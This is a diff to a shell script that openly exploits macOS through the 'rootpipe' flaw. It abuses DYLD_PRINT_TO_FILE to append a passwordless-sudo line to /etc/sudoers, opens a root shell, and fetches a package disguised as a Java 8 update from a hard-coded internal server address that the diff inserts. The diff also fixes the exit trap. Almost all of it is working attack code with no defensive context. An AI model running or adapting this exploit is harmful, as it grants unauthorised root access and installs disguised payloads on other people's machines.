@@ -28,7 +28,7 @@ echo
 #--- EPLOIT THE MACHINE WITH ROOTPIPE ---#
 echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo bash <<'BASHINJECT'
 randomTMP=/tmp$$/
-serverAddress=http://<SERVER_ADDRESS>/Java_8_Update_60.pkg
+serverAddress=192.168.2.175:5980/Java_8_Update_60.pkg
 curledFile=/tmp$$/Java_8_Update_60.pkg
 
 #--- CHECK FOR ROOT ---#
@@ -75,4 +75,4 @@ curledFile=/tmp$$/Java_8_Update_60.pkg
 BASHINJECT
 }
 #--- MAKE SURE WE SUCCEED ---#
-trap KeepSafe exit
+trap KeepSafe EXIT
